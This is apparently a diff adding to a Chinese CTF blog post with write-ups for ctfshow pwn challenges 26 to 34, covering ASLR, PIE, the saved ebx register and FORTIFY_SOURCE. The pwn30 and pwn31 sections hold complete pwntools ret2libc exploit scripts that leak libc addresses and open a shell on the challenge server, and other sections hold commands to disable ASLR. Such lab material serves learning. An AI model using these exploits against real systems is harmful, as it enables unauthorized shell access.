@@ -50,7 +50,7 @@ _start:
 
 
 
-这里再补充一下怎么使用 Nasm 汇编器和 ld 链接器编译成可执行文件。
+这里再补充一下怎么使用 NASM 汇编器和 ld 链接器编译成可执行文件。
 
 首先，将代码保存为一个文件，例如 Welcome_CTFshow.asm 。然后，使用以下命令将其编译为对象文件：
 
@@ -409,13 +409,13 @@ print(io.recvall().decode())
 
 那我们先把这几个参数的意思给弄懂
 
-| **参数**     | **全称**                            | **作用 (白话解释)**                                          | **状态对 Pwn 的影响**                                        |
-| ------------ | ----------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| **参数**     | **全称**                            | **作用 (白话解释)**                                                      | **状态对 Pwn 的影响**                                                                                                                                                                     |
+| ------------ | ----------------------------------- | ------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | **RELRO**    | **Re-location Read-Only**           | **重定位只读**。保护全局偏移表 `.got` 和过程链接表 `.got.plt` 不被篡改。 | **No RELRO** : 我们可以随意修改函数地址（GOT 表劫持）。<br />Partial RELRO：在这种状态下，GOT的开头部分被设置为只读（RO）。<br />Full RELRO：在这种状态下，GOT和PLT都被设置为只读（RO）。 |
-| **Stack**    | **Canary**                          | **栈金丝雀**。在返回地址前放个哨兵。                         | **No canary found**: 只要有 `read` 或 `gets` 溢出，直接覆盖返回地址就能拿 Shell。 |
-| **NX**       | **No-Execute**                      | **堆栈不可执行**。                                           | **NX enabled**: 你不能在栈上跑 Shellcode。必须用 ROP。       |
-| **PIE**      | **Position Independent Executable** | **地址随机化**。                                             | **No PIE**: 程序基址固定为 `0x400000`。你在 IDA 看到的地址就是真实的，直接用！ |
-| **Stripped** | **符号表剥离**                      | **是否去除了函数名**。                                       | **No**: IDA 里能看到 `main`, `system` 等名字。如果是 **Yes**，你只能看到 `sub_400520` 这种代号。 |
+| **Stack**    | **Canary**                          | **栈金丝雀**。在返回地址前放个哨兵。                                     | **No canary found**: 只要有 `read` 或 `gets` 溢出，直接覆盖返回地址就能拿 Shell。                                                                                                         |
+| **NX**       | **No-Execute**                      | **堆栈不可执行**。                                                       | **NX enabled**: 你不能在栈上跑 Shellcode。必须用 ROP。                                                                                                                                    |
+| **PIE**      | **Position Independent Executable** | **地址随机化**。                                                         | **No PIE**: 程序基址固定为 `0x400000`。你在 IDA 看到的地址就是真实的，直接用！                                                                                                            |
+| **Stripped** | **符号表剥离**                      | **是否去除了函数名**。                                                   | **No**: IDA 里能看到 `main`, `system` 等名字。如果是 **Yes**，你只能看到 `sub_400520` 这种代号。                                                                                          |
 
 那到底什么是 got 呢？为了让程序调用外部函数（如 `printf`），Linux 使用了延迟绑定技术。
 
@@ -980,5 +980,479 @@ io.interactive()
 
 
 
+
+### pwn26
+
+#### 题目：
+
+设置好 ASLR 保护参数值即可获得flag
+
+为确保flag正确，本题建议用提供虚拟机运行
+
+
+
+#### 分析：
+
+部分 RELRO 保护，堆栈不可执行
+
+```
+╰─ checksec pwn
+[*] '/home/scdyh/pwn/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+题目提到了 ASLR ，我们先来学习一下
+
+ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置，从而增加了利用软件漏洞进行攻击的难度。简单理解，就是开启保护会让程序运行时的地址随机化，导致必须先获得泄露的地址才能计算出来真实地址
+
+开启不同等级会有不同的效果：
+
+1. 内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和代码的位置。
+2. 地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。
+3. 随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。
+4. 堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，使得攻击者无法轻易地覆盖返回地址或控制程序流程。
+
+ASLR 放在 /proc/sys/kernel/randomize_va_space
+
+```bash
+cat /proc/sys/kernel/randomize_va_space
+# 临时修改
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+看回到程序，可以发现实际上 flag 就是四个地址值分别是：
+
+1. `main`
+2. `system`
+3. `ptr = malloc(4)` 返回的堆地址
+4. `v5 = dlopen(...)` 返回的句柄地址
+
+![image-20260331105520276](/assets/img/posts/pwn-basics/image-20260331105520276.png)
+
+对于主函数来说，看的主要是 PIE ，所以 `main` 往往是固定的
+
+`system` 在 `libc` 里，而 `libc` 是动态库，开启 ALSR 会导致动态库地址随机，所以这个值会变
+但是多运行两边就能发现没有变，这是一i那位这里输出的实际上是 `system@plt` ，这个入口地址是固定的
+
+`ptr` 是在堆上分配的内存，也受 ALSR 的影响
+
+`v5` 返回的是动态库的地址，也受 ALSR 的影响
+
+简单对比一下 0，1，2 时 ALSR 影响的范围
+
+| ASLR  | Executable | PLT  | Heap | Stack | Shared libraries |
+| ----- | ---------- | ---- | ---- | ----- | ---------------- |
+| 0     | ×          | ×    | ×    | ×     | ×                |
+| 1     | ×          | ×    | ×    | √     | √                |
+| 2     | ×          | ×    | √    | √     | √                |
+| 2+PIE | √          | √    | √    | √     | √                |
+
+
+
+
+
+### pwn27
+
+#### 题目：
+
+设置好 ASLR 保护参数值即可获得flag
+
+
+
+#### 分析：
+
+部分 RELRO 保护，堆栈不可执行
+
+```
+╰─ checksec pwn
+[*] '/home/scdyh/pwn/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+这次提示你 ALSR 必须置为0或1，也就是告诉我们 ALSR 置为0或1不会影响这几个的地址值
+
+![image-20260331111113983](/assets/img/posts/pwn-basics/image-20260331111113983.png)
+
+
+
+
+
+### pwn28
+
+#### 题目：
+
+设置好 ASLR 保护参数值即可获得flag
+
+
+
+#### 分析：
+
+```
+╰─ checksec pwn                                              
+[*] '/home/scdyh/pwn/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+在 No PIE 的时候这两个值就是不会变化，所以也不用再去设置了
+
+![image-20260331111852846](/assets/img/posts/pwn-basics/image-20260331111852846.png)
+
+
+
+
+
+### pwn29
+
+#### 题目：
+
+ASLR和PIE开启后
+
+
+
+#### 分析：
+
+保护全开
+
+```
+╰─ checksec pwn
+[*] '/home/scdyh/pwn/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+ASLR 和 PIE 开启后，地址都会将随机化，这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构，也就是**相对偏移是不会变化**的。
+
+![image-20260331112114835](/assets/img/posts/pwn-basics/image-20260331112114835.png)
+
+
+
+
+
+### pwn30
+
+#### 题目：
+
+关闭PIE后
+
+程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。
+
+
+
+#### 分析:
+
+部分 `RELRO` 保护，`NX` 保护没有栈上执行。
+
+```
+╰─ checksec pwn
+[*] '/home/scdyh/pwn/pwn'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+反编译，就是很简单的一个栈溢出，和前面哪一题是一样的，唯一的区别在于程序设定了 `libc-2.27.so`，所以我们不需要用 `write` 泄露相对地址来确定版本
+
+```c
+ssize_t ctfshow()
+{
+  _BYTE buf[132]; // [esp+0h] [ebp-88h] BYREF
+
+  return read(0, buf, 0x100u);
+}
+```
+
+用 `ret2libc` ，只是我们这里不用 `LibcSearcher` ，直接就可以确定
+
+exp
+
+```python
+from pwn import *
+
+io = remote("pwn.challenge.ctf.show", 28289)
+elf = ELF("./pwn")
+
+offset = 0x88 + 4
+main_addr = elf.sym["main"]
+write_plt = elf.plt["write"]
+write_got = elf.got["write"]
+
+# stage 1:
+payload = b"a" * offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+io.clean()
+io.sendline(payload)
+
+write_addr = u32(io.recv(4))
+
+# 这里直接给了，所以直接计算，注意 pwntools 的方法是 sym 不是 dump
+libc = ELF("./libc-2.27.so")
+libc_base = write_addr - libc.sym["write"]
+system_addr = libc_base + libc.sym["system"]
+binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
+
+# stage 2:
+payload = b"a" * offset + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
+io.sendline(payload)
+
+io.interactive()
+```
+
+
+
+
+
+### pwn31
+
+#### 题目：
+
+开启 ASLR 和 PIE 的情况下，仍可能被利用
+
+
+
+#### 分析：
+
+仅关闭 `Canary` 保护
+
+```
+╰─ checksec pwn
+[*] '/home/scdyh/pwn/pwn'
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+反编译看一下，这道题关键的地方就在于程序先打印出 `main` 函数的地址，这题由于开启了地址随机化，所以我们需要先计算程序的基地址
+
+```
+base = real_main - main_offset
+```
+
+还有一个问题，在 32 位 x86 的 PIE/PIC 程序里，如果开启地址随机化，访问 GOT/PLT 时经常要依赖 `ebx` 保存一个基准地址，后续再通过“基址 + 偏移”的方式找到对应位置，主要就是看有没有这么一段。
+
+```nasm
+push ebx
+...
+mov ebx, [ebp-4]
+```
+
+所以这次函数除了返回地址，还额外依赖了这个被保存到栈上的寄存器 `ebx`。如果我们不修复它，而是让 `buf` 直接把这部分冲坏，那么函数返回前恢复出来的 `ebx` 就会是错的，程序后面再通过 GOT/PLT 去找东西时就可能找错甚至直接崩溃。简单记忆的话，就是：**这题不仅要控返回地址，还要把 `buf` 后面那 4 个字节里的 `saved ebx` 手动恢复正确。**
+
+我们可以来模拟一下这时候栈溢出覆盖的情况
+
+```
+低地址
+[ buf 132字节 ]
+[ saved ebx ]      <- [ebp-4]
+[ saved ebp ]      <- [ebp]
+[ ret ]            <- [ebp+4]
+[ arg1 ]
+[ arg2 ]
+[ arg3 ]
+高地址
+```
+
+这时候payload变成了
+
+```
+[ buf: "AAAA....AAAA" ]   132字节
+[ saved ebx = ebx ]       4字节
+[ fake ebp = "AAAA" ]     4字节
+[ ret = write@plt ]       4字节
+[ next = ctfshow ]        4字节
+[ fd = 1 ]                4字节
+[ buf = write_got ]       4字节
+[ n = 4 ]                 4字节
+```
+
+`saved ebx` 在 ida 双击 `_GLOBAL_OFFSET_TABLE_`
+
+![image-20260402104212581](/assets/img/posts/pwn-basics/image-20260402104212581.png)
+
+exp
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context.log_level = 'debug'
+
+io = remote("pwn.challenge.ctf.show", 28181)
+elf = ELF('./pwn')
+
+# 泄露 PIE base
+main_addr = int(io.recvline().strip(), 16)
+base = main_addr - elf.sym['main']
+
+ctfshow = base + elf.sym['ctfshow']
+write_plt = base + elf.plt['write']
+write_got = base + elf.got['write']
+
+# 这个 ebx 是手动找的（保持不变）
+ebx = base + 0x1fc0
+
+payload = b"A" * 132 + p32(ebx) + b"AAAA" + p32(write_plt) + p32(ctfshow) + p32(1) + p32(write_got) + p32(4)
+
+io.send(payload)
+
+write_addr = u32(io.recvn(4))
+
+libc = LibcSearcher("write", write_addr)
+libc_base = write_addr - libc.dump("write")
+system_addr = libc_base + libc.dump("system")
+binsh_addr = libc_base + libc.dump("str_bin_sh")
+
+payload  = b"B" * 140 + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)
+
+io.send(payload)
+
+io.interactive()
+```
+
+![image-20260402110839522](/assets/img/posts/pwn-basics/image-20260402110839522.png)
+
+
+
+
+
+### pwn32
+
+#### 题目：
+
+FORTIFY_SOURCE=0：
+
+禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。
+
+
+
+#### 分析：
+
+只有栈运行没有保护
+
+```
+╰─ checksec pwn
+[*] '/home/scdyh/pwn/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+    Debuginfo:  Yes
+```
+
+简单介绍 `FORTIFY_SOURCE` 一下，它是给一些危险字符串/内存函数加“安全辅助检查”的编译选项，也就是说程序在编译的时候就会把保护机制添加到函数里，如果确实存在一些危险的溢出，这些保护机制就会让程序中止。
+
+这一题我们先能看到主函数前面的溢出情况，但是最后的 `Undefined` 函数直接能打印flag，只需要 `argc > 4` 即可
+
+![image-20260402113636263](/assets/img/posts/pwn-basics/image-20260402113636263.png)
+
+```
+点 1：memcpy(buf1, argv[2], v5);
+
+这里的 v5 来自：
+
+v5 = strtol(argv[3], 0LL, 10);
+
+也就是你自己能控制拷贝长度。
+
+但 buf1 只有 11 字节：
+
+char buf1[11];
+
+所以如果 v5 > 11，这里就是溢出。
+
+这个你已经接触过一点，不算全新。
+
+点 2：strcpy(buf2, argv[1]);
+
+buf2 也只有 11 字节：
+
+char buf2[11];
+
+如果 argv[1] 很长，也会溢出。
+
+这个也还是“经典栈溢出”，不是这题最核心的新内容。
+
+点 3：printf(buf1, &num);
+
+这个才是这题最值得学的。
+
+因为前面你可以通过：
+
+memcpy(buf1, argv[2], v5);
+
+把你想要的内容放进 buf1，
+然后程序又执行：
+
+printf(buf1, &num);
+
+所以你等于可控了 printf 的格式字符串。
+```
+
+
+
+
+
+### pwn33
+
+#### 题目：
+
+FORTIFY_SOURCE=1：
+
+启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。
+
+
+
+#### 分析：
+
+对比两个主函数，很明显能看到函数名称都变了，分别是 `__memcpy_chk` 和 `__strcpy_chk`
+
+![image-20260402113843620](/assets/img/posts/pwn-basics/image-20260402113843620.png)
+
+
+
+
+
+### pwn34
+
+#### 题目：
+
+FORTIFY_SOURCE=2：
+
+启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。
+
+
+
+#### 分析：
+
+能看到，这回多了 `  __printf_chk` 的安全检查
+
+![image-20260402114158626](/assets/img/posts/pwn-basics/image-20260402114158626.png)
 
 
